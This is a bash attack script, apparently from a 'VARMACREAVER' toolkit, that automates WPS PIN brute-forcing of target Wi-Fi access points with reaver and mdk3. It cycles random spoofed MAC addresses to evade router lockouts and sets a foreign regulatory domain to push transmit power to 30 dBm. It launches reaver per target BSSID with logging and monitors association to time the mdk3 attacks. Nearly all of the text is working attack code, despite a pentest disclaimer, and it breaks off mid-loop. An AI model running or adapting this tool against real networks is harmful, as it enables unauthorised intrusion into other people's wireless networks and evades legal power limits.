#!/bin/bash
# This program is free software; you can redistribute it and/or modify it under the terms of
# the GNU General Public 
# License as published by the Free Software Foundation; either version 2 of the License, or
# any later version.
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;\
# without even the implied 
# warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public
# License for more details.
# You should have received a copy of the GNU General Public License along with this program;
# if not, write to the
# Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
# #--------------------------------------------------------------------------------------------------------------------
#
# Disclaimer:   This script is intended for use only for private study or during an authorised
# pentest. The author bears no responsibility for malicious or illegal use.
#               Skiddies should look elsewhere.
#
# !!!!!!!Thanks to Vulpi author of pwnstar9.0 who's scripts taught us so much!!!!!!!
##############################################
# ANSI code routines from Vulpi author of
#              PwnStar9.0 
txtrst="\e[0m"      # Text reset 
warn="\e[1;31m"     # warning		   red         
info="\e[1;34m"     # info                 blue             
q="\e[1;32m"	    # questions            green
inp="\e[1;36m"	    # input variables      magenta
yel="\e[1;33m"      # typed keyboard entries
##############################################

echo -e "$info varmacreavermdk3var-009.sh"
echo -e ""
echo -e "$yel                            |||||||||||||||||||||||||"
echo -e "$yel                            ||$info VARMACREAVER-mdkvar$yel ||"
echo -e "$yel                            |||||||||||||||||||||||||"
echo ""
echo -e "$info                 In Memory of Alan M. Turing and the work of Betchly Park"
echo -e "$info       If you eliminate the wrong solutions you are left with the right answer."

echo -e "$info                                 All Thanks To Wn722"
echo ""
echo -e "$info                  A Musket Team Special Case WPS Pin Harvester"
echo -e "$warn          Read Help Comments in maclistreavermdkvar1 Before Employing"
echo -e "$info                                                                        "      
echo -e "$warn  <<< ALL EXISTING MONITOR INTERFACES $yel(i.e. mon0 mon1 etc.)$warn WILL BE CLEARED >>>"
echo -e "$info  A $yel maclistreavermdkvar1$info configuration file$warn MUST$info be written"
echo -e "$info  and placed in the /root/VARMAC_CONFIG folder before continuing. >>>"
echo ""
echo -e "$q                     ??????????????????????????????????????"
echo -e "$info         ??Pausing to allow user to complete file preparation ....??$txtrst"

echo -e ""
while true

do
echo -e "$inp                              Press $yel(y/Y)$inp to continue...."
echo -e "         Press $yel(n/N)$inp to abort!!..Press any other key to try again:$txtrst"

  read CONFIRM
  case $CONFIRM in
    y|Y|YES|yes|Yes) break ;;
    n|N|no|NO|No)
      echo Aborting - you entered $CONFIRM
      exit
      ;;

	  esac

		done

echo -e "$info  You entered $CONFIRM.  Continuing ...$txtrst"
sleep 3

clear
echo ""
echo -e "$info Clearing ALL  monitors, reaver wash and mdk3 - please wait."

killall -q wash &> /dev/null
killall -q reaver &> /dev/null 
killall -q mdk3 &> /dev/null
killall -q Eterm &> /dev/null

####clear ALL MONITORS ####

airmon-ng stop mon10 &> /dev/null
airmon-ng stop mon9 &> /dev/null
airmon-ng stop mon8 &> /dev/null
airmon-ng stop mon7 &> /dev/null
airmon-ng stop mon6 &> /dev/null
airmon-ng stop mon5 &> /dev/null
airmon-ng stop mon4 &> /dev/null
airmon-ng stop mon3 &> /dev/null
airmon-ng stop mon2 &> /dev/null
airmon-ng stop mon1 &> /dev/null
airmon-ng stop mon0 &> /dev/null
rm configlist.txt &> /dev/null

######make directory for reaver output #############

if [[ ! -d "VARMAC_LOGS" ]]; then
    mkdir -p -m 700 VARMAC_LOGS;

	fi

##################end make dir######################

######make directory for reaver output and warn #############

clear
if [[ ! -d "/root/VARMAC_CONFIG" ]]; then
	mkdir -p -m 700 VARMAC_CONFIG;
	echo " "
	echo -e "$warn !!!The$yel VARMAC_CONFIG$warn directory does not exist!!!"

	echo -e "$info   Making VARMAC_CONFIG directory in root."
	echo ""
	echo -e "$inp  Place a$yel maclistreavermdkvar1$inp config file  OR any other file name"
	echo ""
	echo -e "$inp  with same template in the$yel /root/VARMAC_CONFIG$inp folder"
	echo -e  "$txtrst "

while true

	do
echo -e "$inp                              Press $yel(y/Y)$inp to continue...."
echo -e "         Enter $yel(n/N)$inp to abort!!..Press any other key to try again:$txtrst"

  read CONFIRM
  case $CONFIRM in
    y|Y|YES|yes|Yes) break ;;
    n|N|no|NO|No)
      echo Aborting - you entered $CONFIRM
      exit
      ;;

	esac
		done
echo -e "$info  You entered $CONFIRM.  Continuing ... $txtrst"
sleep 3
clear

        fi

############Check to see if VARMAC_CONFIG is empty###########

############ End Check to see if VARMAC_CONFIG is empty###########
FILE=""
DIR="/root/VARMAC_CONFIG"

if  [ "$(ls -A $DIR)" ]; then

	echo -e "$txtrst"
	echo -e "  Checking if $DIR is empty... - OK continuing...."
    	sleep 3
	echo -e "$txtrst "
    else 
	echo " "
	echo -e "$warn         !!!The VARMAC_CONFIG folder is empty!!!"
	echo " "
	echo -e "$info  Place a$yel maclistreavermdkvar1$info config file OR any other file name. $txtrst"
	echo " " 
	echo -e "$info  with same template in the$yel /root/VARMAC_CONFIG$info folder. $txtrst"
	echo " "

    while true

	do

echo -e "$inp                              Press $yel(y/Y)$inp to continue...."
echo -e "         Enter $yel(n/N)$inp to abort!!..Press any other key to try again: $txtrst"

  read CONFIRM
  case $CONFIRM in
    y|Y|YES|yes|Yes) break ;;
    n|N|no|NO|No)
      echo Aborting - you entered $CONFIRM
      exit
      ;;

	esac
		done

echo -e "$info  You entered $CONFIRM.  Continuing ... $txtrst"
sleep 3
clear

        fi

#### Switch for Advanced Monitor

ADVANMON=ZZZ
ADVAN_TIME=ZZZ
OVERRIDE_MDK3=n

#remove any possible unary operator warning for variables not used
# junk dna below leave in place for program expansion

WPS_PIN1=180
WPS_PIN2=180
WPS_PIN3=180
WPS_PIN4=180
WPS_PIN5=180
WPS_PIN6=180
WPS_PIN7=180
WPS_PIN8=180
WPS_PIN9=180
WPS_PIN10=180
WPS_PIN11=180
WPS_PIN12=180
WPS_PIN13=180
WPS_PIN14=180
WPS_PIN15=180
WPS_PIN16=180
WPS_PIN17=180
WPS_PIN18=180
WPS_PIN19=180
WPS_PIN20=180
WPS_PIN21=180
WPS_PIN22=180
WPS_PIN23=180
WPS_PIN24=180
WPS_PIN25=180
WPS_PIN26=180
WPS_PIN27=180
WPS_PIN28=180
WPS_PIN29=180
WPS_PIN30=180
WPS_PIN31=180
WPS_PIN32=180
WPS_PIN33=180
WPS_PIN34=180
WPS_PIN35=180
WPS_PIN36=180
WPS_PIN37=180
WPS_PIN38=180
WPS_PIN39=180
WPS_PIN40=180
WPS_PIN41=180
WPS_PIN42=180
WPS_PIN43=180
WPS_PIN44=180
WPS_PIN45=180
WPS_PIN46=180
WPS_PIN47=180
WPS_PIN48=180
WPS_PIN49=180
WPS_PIN50=180
#
USE_PIN1=XXX
USE_PIN2=XXX
USE_PIN3=XXX
USE_PIN4=XXX
USE_PIN5=XXX
USE_PIN6=XXX
USE_PIN7=XXX
USE_PIN8=XXX
USE_PIN9=XXX
USE_PIN10=XXX
USE_PIN11=XXX
USE_PIN12=XXX
USE_PIN13=XXX
USE_PIN14=XXX
USE_PIN15=XXX
USE_PIN16=XXX
USE_PIN17=XXX
USE_PIN18=XXX
USE_PIN19=XXX
USE_PIN20=XXX
USE_PIN21=XXX
USE_PIN22=XXX
USE_PIN23=XXX
USE_PIN24=XXX
USE_PIN25=XXX
USE_PIN26=XXX
USE_PIN27=XXX
USE_PIN28=XXX
USE_PIN29=XXX
USE_PIN30=XXX
USE_PIN31=XXX
USE_PIN32=XXX
USE_PIN33=XXX
USE_PIN34=XXX
USE_PIN35=XXX
USE_PIN36=XXX
USE_PIN37=XXX
USE_PIN38=XXX
USE_PIN39=XXX
USE_PIN40=XXX
USE_PIN41=XXX
USE_PIN42=XXX
USE_PIN43=XXX
USE_PIN44=XXX
USE_PIN45=XXX
USE_PIN46=XXX
USE_PIN47=XXX
USE_PIN48=XXX
USE_PIN49=XXX
USE_PIN50=XXX
#
KEEP_FILE1=XXX
KEEP_FILE2=XXX
KEEP_FILE3=XXX
KEEP_FILE4=XXX
KEEP_FILE5=XXX
KEEP_FILE6=XXX
KEEP_FILE7=XXX
KEEP_FILE8=XXX
KEEP_FILE9=XXX
KEEP_FILE10=XXX
KEEP_FILE11=XXX
KEEP_FILE12=XXX
KEEP_FILE13=XXX
KEEP_FILE14=XXX
KEEP_FILE15=XXX
KEEP_FILE16=XXX
KEEP_FILE17=XXX
KEEP_FILE18=XXX
KEEP_FILE19=XXX
KEEP_FILE20=XXX
KEEP_FILE21=XXX
KEEP_FILE22=XXX
KEEP_FILE23=XXX
KEEP_FILE24=XXX
KEEP_FILE25=XXX
KEEP_FILE26=XXX
KEEP_FILE27=XXX
KEEP_FILE28=XXX
KEEP_FILE29=XXX
KEEP_FILE30=XXX
KEEP_FILE31=XXX
KEEP_FILE32=XXX
KEEP_FILE33=XXX
KEEP_FILE34=XXX
KEEP_FILE35=XXX
KEEP_FILE36=XXX
KEEP_FILE37=XXX
KEEP_FILE38=XXX
KEEP_FILE39=XXX
KEEP_FILE40=XXX
KEEP_FILE41=XXX
KEEP_FILE42=XXX
KEEP_FILE43=XXX
KEEP_FILE44=XXX
KEEP_FILE45=XXX
KEEP_FILE46=XXX
KEEP_FILE47=XXX
KEEP_FILE48=XXX
KEEP_FILE49=XXX
KEEP_FILE50=XXX
#
NAME1=XXX
NAME2=XXX
NAME3=XXX
NAME4=XXX
NAME5=XXX
NAME6=XXX
NAME7=XXX
NAME8=XXX
NAME9=XXX
NAME10=XXX
NAME11=XXX
NAME12=XXX
NAME13=XXX
NAME14=XXX
NAME15=XXX
NAME16=XXX
NAME17=XXX
NAME18=XXX
NAME19=XXX
NAME20=XXX
NAME21=XXX
NAME22=XXX
NAME23=XXX
NAME24=XXX
NAME25=XXX
NAME26=XXX
NAME27=XXX
NAME28=XXX
NAME29=XXX
NAME30=XXX
NAME31=XXX
NAME32=XXX
NAME33=XXX
NAME34=XXX
NAME35=XXX
NAME36=XXX
NAME37=XXX
NAME38=XXX
NAME39=XXX
NAME40=XXX
NAME41=XXX
NAME42=XXX
NAME43=XXX
NAME44=XXX
NAME45=XXX
NAME46=XXX
NAME47=XXX
NAME48=XXX
NAME49=XXX
NAME50=XXX
#
LIVE1=180
LIVE2=180
LIVE3=180
LIVE4=180
LIVE5=180
LIVE6=180
LIVE7=180
LIVE8=180
LIVE9=180
LIVE10=180
LIVE11=180
LIVE12=180
LIVE13=180
LIVE14=180
LIVE15=180
LIVE16=180
LIVE17=180
LIVE18=180
LIVE19=180
LIVE20=180
LIVE21=180
LIVE22=180
LIVE23=180
LIVE24=180
LIVE25=180
LIVE26=180
LIVE27=180
LIVE28=180
LIVE29=180
LIVE30=180
LIVE31=180
LIVE32=180
LIVE33=180
LIVE34=180
LIVE35=180
LIVE36=180
LIVE37=180
LIVE38=180
LIVE39=180
LIVE40=180
LIVE41=180
LIVE42=180
LIVE43=180
LIVE44=180
LIVE45=180
LIVE46=180
LIVE47=180
LIVE48=180
LIVE49=180
LIVE50=180
#
USE_R1=ZZZ
USE_R2=ZZZ
USE_R3=ZZZ
USE_R4=ZZZ
USE_R5=ZZZ
USE_R6=ZZZ
USE_R7=ZZZ
USE_R8=ZZZ
USE_R9=ZZZ
USE_R10=ZZZ
USE_R11=ZZZ
USE_R12=ZZZ
USE_R13=ZZZ
USE_R14=ZZZ
USE_R15=ZZZ
USE_R16=ZZZ
USE_R17=ZZZ
USE_R18=ZZZ
USE_R19=ZZZ
USE_R20=ZZZ
USE_R21=ZZZ
USE_R22=ZZZ
USE_R23=ZZZ
USE_R24=ZZZ
USE_R25=ZZZ
USE_R26=ZZZ
USE_R27=ZZZ
USE_R28=ZZZ
USE_R29=ZZZ
USE_R30=ZZZ
USE_R31=ZZZ
USE_R32=ZZZ
USE_R33=ZZZ
USE_R34=ZZZ
USE_R35=ZZZ
USE_R36=ZZZ
USE_R37=ZZZ
USE_R38=ZZZ
USE_R39=ZZZ
USE_R40=ZZZ
USE_R41=ZZZ
USE_R42=ZZZ
USE_R43=ZZZ
USE_R44=ZZZ
USE_R45=ZZZ
USE_R46=ZZZ
USE_R47=ZZZ
USE_R48=ZZZ
USE_R49=ZZZ
USE_R50=ZZZ
#
USE_LONG1=ZZZ
USE_LONG2=ZZZ
USE_LONG3=ZZZ
USE_LONG4=ZZZ
USE_LONG5=ZZZ
USE_LONG6=ZZZ
USE_LONG7=ZZZ
USE_LONG8=ZZZ
USE_LONG9=ZZZ
USE_LONG10=ZZZ
USE_LONG11=ZZZ
USE_LONG12=ZZZ
USE_LONG13=ZZZ
USE_LONG14=ZZZ
USE_LONG15=ZZZ
USE_LONG16=ZZZ
USE_LONG17=ZZZ
USE_LONG18=ZZZ
USE_LONG19=ZZZ
USE_LONG20=ZZZ
USE_LONG21=ZZZ
USE_LONG22=ZZZ
USE_LONG23=ZZZ
USE_LONG24=ZZZ
USE_LONG25=ZZZ
USE_LONG26=ZZZ
USE_LONG27=ZZZ
USE_LONG28=ZZZ
USE_LONG29=ZZZ
USE_LONG30=ZZZ
USE_LONG31=ZZZ
USE_LONG32=ZZZ
USE_LONG33=ZZZ
USE_LONG34=ZZZ
USE_LONG35=ZZZ
USE_LONG36=ZZZ
USE_LONG37=ZZZ
USE_LONG38=ZZZ
USE_LONG39=ZZZ
USE_LONG40=ZZZ
USE_LONG41=ZZZ
USE_LONG42=ZZZ
USE_LONG43=ZZZ
USE_LONG44=ZZZ
USE_LONG45=ZZZ
USE_LONG46=ZZZ
USE_LONG47=ZZZ
USE_LONG48=ZZZ
USE_LONG49=ZZZ
USE_LONG50=ZZZ

# end of junk dna to leave in place for program expansion

### junk dna below save in case reaver output can be quantified when -L in residence.

ERAS=ZZZ
EAPOL="[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response"

### end of junk dna

##########source file names and existance###############

SOURCENAMETEST=ZZZ

until  [ $SOURCENAMETEST == y ] || [ $SOURCENAMETEST == Y ]; do  

echo -e "$txtrst "
ls /root/VARMAC_CONFIG | tee configlist.txt
clear

# Make file list in folder a variable
configfiles=$(cat configlist.txt | nl -ba -w 1  -s ': ')

echo ""
echo -e "$info Configuration files listed in the$yel VARMAC_CONFIG$info folder.$txtrst"
echo " "
echo "$configfiles" | sed 's/^/       /'
echo ""
echo -e "$inp    Select the$yel configfile$inp to be used.$txtrst"
echo -e "$info  After selection the config file will be seen in leafpad." 
echo -e "  You may inspect your entries then delimit leafpad and continue..."
echo -e "  To adjust entries while program is running change the entries and save.$txtrst"
echo ""
read  -p "   Enter Line Number Here: " grep_Line_Number

echo -e "$txtrst"
SOURCENAME=$(cat configlist.txt | sed -n ""$grep_Line_Number"p")
echo ""

	while true
	do

leafpad /root/VARMAC_CONFIG/$SOURCENAME &
echo ""
echo -e "$info You have chosen$yel $SOURCENAME$info as your configuration file."
echo -e "$inp Enter$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read SOURCENAMETEST

	case $SOURCENAMETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"
	rm configlist.txt
	done

		done

rm configlist.txt &> /dev/null
#####################################

### Load configuration file

SOURCEGOODTEST=ZZZ

until  [ $SOURCEGOODTEST == y ] || [ $SOURCEGOODTEST == Y ]; do

source /root/VARMAC_CONFIG/$SOURCENAME

while true

do

echo -e "$info    The $SOURCENAME config file is loading. If no error messages"
echo -e "$info  are seen above press$yel (y/Y)$inp to continue...."
echo -e "$info  If error messages ARE SEEN open the config file with leafpad,"
echo -e "$info  correct the errors and save. NOW retest by pressing$yel (n/N)." 
echo -e "$info  If errors are gone press$yel (y/Y)$inp, to continue...."
echo -e "$info  If errors remain try correcting again.$txtrst"

read SOURCEGOODTEST

	case $SOURCEGOODTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"
	rm configlist.txt

	done

		done

sleep 3

clear

####################################

REAVERDIR="VARMAC_LOGS"

#look for empty dir

NOTEMPT=ZZZ
if [ "$(ls -A $REAVERDIR)" ]; then

      NOTEMPT=1

	fi

if [ $NOTEMPT == 1 ]; then

echo ""    
echo -e "$warn         !!!!The VARMAC_LOG directory is not empty.!!!!$txtrst" 

ERASTEST=ZZZ

until  [ $ERASTEST == y ] || [ $ERASTEST == Y ]; do  
echo -e "$txtrst"
echo -e "$q  Do you wish to erase all files in the VARMAC_LOG Directory?"
echo -e "$info     Leaving these files in place will not affect the program."
echo "" 
echo -e "$inp  Type$yel(y/Y)$inp to erase these files or$yel(n/N)$inp to $txtrst"
echo -e "$inp    leave these files in place.$txtrst"
read ERAS

	while true
	do

echo ""
echo -e "$inp  You entered$yel $ERAS$info type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again$txtrst"
read ERASTEST

	case $ERASTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done
		done
			fi

if [ $ERAS == y ] || [ $ERAS == Y ]; then


	rm -rfv VARMAC_LOGS/* &> /dev/null

		fi
##################Retain original names for text warning##########
NMEWARN1=$NAME1
NMEWARN2=$NAME2
NMEWARN3=$NAME3
NMEWARN4=$NAME4
NAMWARN5=$NAME5
NMEWARN6=$NAME6
NMEWARN7=$NAME7
NMEWARN8=$NAME8
NMEWARN9=$NAME9
NMEWARN10=$NAME10
NMEWARN11=$NAME11
NMEWARN12=$NAME12
NMEWARN13=$NAME13
NMEWARN14=$NAME14
NMEWARN15=$NAME15
NMEWARN16=$NAME16
NMEWARN17=$NAME17
NMEWARN18=$NAME18
NMEWARN19=$NAME19
NMEWARN20=$NAME20
NMEWARN21=$NAME21
NMEWARN22=$NAME22
NMEWARN23=$NAME23
NMEWARN24=$NAME24
NMEWARN25=$NAME25
NMEWARN26=$NAME26
NMEWARN27=$NAME27
NMEWARN28=$NAME28
NMEWARN29=$NAME29
NMEWARN30=$NAME30
NMEWARN31=$NAME31
NMEWARN32=$NAME32
NMEWARN33=$NAME33
NMEWARN34=$NAME34
NMEWARN35=$NAME35
NMEWARN36=$NAME36
NMEWARN37=$NAME37
NMEWARN38=$NAME38
NMEWARN39=$NAME39
NMEWARN40=$NAME40
NMEWARN41=$NAME41
NMEWARN42=$NAME42
NMEWARN43=$NAME43
NMEWARN44=$NAME44
NMEWARN45=$NAME45
NMEWARN46=$NAME46
NMEWARN47=$NAME47
NMEWARN48=$NAME48
NMEWARN49=$NAME49
NMEWARN50=$NAME50

##########End retain original name for reaver warnings########

###########Remove Spaces in Names for file names#########

NAME1=${NAME1// /_}
NAME2=${NAME2// /_}
NAME3=${NAME3// /_}
NAME4=${NAME4// /_}
NAME5=${NAME5// /_}
NAME6=${NAME6// /_}
NAME7=${NAME7// /_}
NAME8=${NAME8// /_}
NAME9=${NAME9// /_}
NAME10=${NAME10// /_}
NAME11=${NAME11// /_}
NAME12=${NAME12// /_}
NAME13=${NAME13// /_}
NAME14=${NAME14// /_}
NAME15=${NAME15// /_}
NAME16=${NAME16// /_}
NAME17=${NAME17// /_}
NAME18=${NAME18// /_}
NAME19=${NAME19// /_}
NAME20=${NAME20// /_}
NAME21=${NAME21// /_}
NAME22=${NAME22// /_}
NAME23=${NAME23// /_}
NAME24=${NAME24// /_}
NAME25=${NAME25// /_}
NAME26=${NAME26// /_}
NAME27=${NAME27// /_}
NAME28=${NAME28// /_}
NAME29=${NAME29// /_}
NAME30=${NAME30// /_}
NAME31=${NAME31// /_}
NAME32=${NAME32// /_}
NAME33=${NAME33// /_}
NAME34=${NAME34// /_}
NAME35=${NAME35// /_}
NAME36=${NAME36// /_}
NAME37=${NAME37// /_}
NAME38=${NAME38// /_}
NAME39=${NAME39// /_}
NAME40=${NAME40// /_}
NAME41=${NAME41// /_}
NAME42=${NAME42// /_}
NAME43=${NAME43// /_}
NAME44=${NAME44// /_}
NAME45=${NAME45// /_}
NAME46=${NAME46// /_}
NAME47=${NAME47// /_}
NAME48=${NAME48// /_}
NAME49=${NAME49// /_}
NAME50=${NAME50// /_}

##########End Remove Spaces in Names#########

sleep 2
clear
##########END OF source file names and existance#############
echo ""
iwconfig

DEVTEST=ZZZ

until  [ $DEVTEST == y ] || [ $DEVTEST == Y ]; do  

echo -e "$txtrst "
echo ""
echo -e "$q  What wireless device will you use to perform the attack$yel(i.e. wlan0,ath0 etc)$q?"
echo -e "$info    A listing of devices is shown above.$txtrst" #(DEV)
read DEV

	while true
	do

echo ""
echo -e "$inp  You entered$yel $DEV$info type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read DEVTEST

	case $DEVTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

#####################################

ifconfig $DEV down
iwconfig $DEV mode managed
ifconfig $DEV up

clear
	while true
	do

echo ""
echo -e "$q    Do you wish to boost your wifi device power to 30dBm?"
echo -e "$info  This routine works for the AWUSO36H and" #(AWUSO)
echo -e "$info  may work with other devices."
echo -e "$inp  Type$yel (y/Y)$inp for yes or$yel (n/N)$inp for no.$txtrst"
		read AWUSO
		case $AWUSO in
		y|Y|n|N) break ;;
		~|~~)
		echo Aborting -
		exit
		;;

		esac
		echo -e  "$warn !!!Wrong input try again!!!$txtrst"

			done

	if [ $AWUSO == y ] || [ $AWUSO == Y ]; then

		ifconfig $DEV down
		sleep 1
		iw reg set BO
		ifconfig $DEV up
		iwconfig $DEV channel 13
		iwconfig $DEV txpower 30
		iwconfig $DEV rate 1M
        	sleep 2
 
			fi

airmon-ng start $DEV
	sleep 1

MONTEST=ZZZ

until  [ $MONTEST == y ] || [ $MONTEST == Y ]; do  
echo -e "$txtrst "
clear
iwconfig
echo ""
echo -e "$q    What wireless monitor interface$yel (i.e. mon0, mon1)$q will"
echo -e "  be used by reaver?"
echo -e "$info  A listing of devices is shown above.$txtrst" #(MON)
read MON

	while true
	do

echo ""
echo -e "$inp  You entered$yel $MON$info type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read MONTEST

	case $MONTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

        clear

#############################################################

COUNTTEST=ZZZ

until  [ $COUNTTEST == y ] || [ $COUNTTEST == Y ]; do  

clear
echo ""
echo -e "$q  How many times do you want the program to cycle thru all targetAPs? (COUNT)"
echo ""
echo -e "$warn     !!!!Enter a number less then 100,000!!!!$txtrst"
read COUNT


while  [ $COUNT -gt 99999 ]; do
        echo -e "$warn  !!!Please enter a number less than 100,000!!!"
	echo -e "$q     How many times do you want the program to cycle thru all targetAPs?(COUNT)$txtrst"
      	read COUNT

	done

while true

	do

echo ""
echo -e "$inp  You entered$yel $COUNT$inp type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
	read COUNTTEST

	case $COUNTTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

FN=1

let COUNTSTART=COUNT

while  [ $COUNT -gt 0 ]; do

echo -e "$txtrst" 

if [ $COUNTSTART -lt 1000 ]; then

	PAD=`printf "%03d\n" $FN`
	if [ $FN -gt 1 ]; then
   	let PF=FN-1
   	CF=`printf "%03d\n" $PF`
		fi	
			fi

if [ $COUNTSTART -gt 999 ] && [ $COUNTSTART -lt 10000 ]; then

	PAD=`printf "%04d\n" $FN`
	if [ $FN -gt 1 ]; then
   	let PF=FN-1
   	CF=`printf "%04d\n" $PF`
		fi
			fi

if [ $COUNTSTART -gt 9999 ] && [ $COUNTSTART -lt 100000 ]; then

	PAD=`printf "%05d\n" $FN`
	if [ $FN -gt 1 ]; then
   	let PF=FN-1
   	CF=`printf "%05d\n" $PF`
		fi

			fi

echo -e "$txtrst"
DATEFILE=$(date +%y%m%d-%H:%M)

#$TARGETAP1-$DATEFILE-$PAD Note hours and min added to avoid overwrite

echo -e "$info  Assigning a random mac address to$yel $DEV$info.$txtrst"
sleep 1

ifconfig $DEV down
iwconfig $DEV mode managed
sleep 1
macchanger -r $DEV
sleep 2
VARMAC=$(ifconfig $DEV | grep "$DEV     Link encap:Ethernet  HWaddr " | sed s/"$DEV     Link encap:Ethernet  HWaddr "//g)
sleep 2
ifconfig $DEV hw ether $VARMAC
sleep 2
ifconfig $DEV up

echo -e "$info  Assigning$yel $DEV$info mac address to$yel $MON$info. $txtrst"

ifconfig $MON down
sleep 1
macchanger -m $VARMAC $MON
sleep .1
ifconfig $MON up

### make more monitors and make random macs  ####

if [ $MON == mon0 ]; then

	airmon-ng start $DEV 
	MON1=mon1
	ifconfig $MON1 down
	sleep 1
        macchanger -r $MON1
	sleep 1
        ifconfig $MON1 up

	airmon-ng start $DEV 
	MON2=mon2
	ifconfig $MON2 down
	sleep 1
        macchanger -r $MON2
	sleep 1
        ifconfig $MON2 up


		fi

if [ $MON == mon1 ]; then

	airmon-ng start $DEV 
	MON1=mon2
	ifconfig $MON1 down
	sleep 1
        macchanger -r $MON1
	sleep 1
        ifconfig $MON1 up

	airmon-ng start $DEV 
	MON2=mon3
	ifconfig $MON2 down
	sleep 1
        macchanger -r $MON2
	sleep 1
        ifconfig $MON2 up

		fi

if [ $MON == mon2 ]; then

	airmon-ng start $DEV 
	MON1=mon3
	ifconfig $MON1 down
	sleep 1
        macchanger -r $MON1
	sleep 1
        ifconfig $MON1 up

	airmon-ng start $DEV 
	MON2=mon4
	ifconfig $MON2 down
	sleep 1
        macchanger -r $MON2
	sleep 1
        ifconfig $MON2 up

		fi

if [ $MON == mon3 ]; then

	airmon-ng start $DEV 
	MON1=mon4
	ifconfig $MON1 down
	sleep 1
        macchanger -r $MON1
	sleep 1
        ifconfig $MON1 up

	airmon-ng start $DEV 
	MON2=mon5
	ifconfig $MON2 down
	sleep 1
        macchanger -r $MON2
	sleep 1
        ifconfig $MON2 up


		fi

##### Handel -1 issue #####

ifconfig $DEV down
iwconfig $DEV mode monitor
ifconfig $DEV up

sleep 2 
clear

###############################Start USR Block################################################

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]]; then

echo -e " "
echo -e "$info             Starting Reaver"
echo -e "$info TargetAP Name                      = $yel$NMEWARN1"
echo -e "$info Monitor                            = $yel$MON"
echo -e "$info Channel(note 0 = channel hopping)  = $yel$CHANNEL1"
echo -e "$info Mac code of Target AP              = $yel$TARGETAP1"
echo -e "$info Random Mac code                    = $yel$VARMAC"
echo -e "$info Reaver live time                   = $yel$LIVE1$info sec"
echo -e "$info Reaver start/stop cycles remaining = $yel$COUNT"
echo -e "$info Text Log  in  /root/VARMAC_LOGS    = $yel$NAME1-$DATEFILE-$PAD"
echo -e "$txtrst"

Eterm -g 80x10-1+100 --cmod "red" -T "Reaver1" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -vv -x 60 -L --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

echo -e "$info Router Pause/Recovery Time         = $yel$PAUSE$info sec"
echo -e "$info MDK3 Attack Time                   = $yel$MDKLIVE$info sec"
echo -e " "
echo -e "$warn Monitor WPS Pin Collection - Adjust Reaver Live Time Accordingly!!!$txtrst"
echo -e ""

#######DETERMINE WPS LOCKED-NO ASSOC BEGIN ########
# Divide time to take file snaps every 1/5 LIVE time to avoid subprocess hang with tail.
LIVEDIV=$(((($ADVAN_TIME-60))/8))
LINECAP=2 # Set line capture switch

if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

if [ $LINECAP -eq 2 ]; then 
	tput sc
	echo " "
	echo -e "$info  1. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "1. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################

if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  2. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "2. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  3. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

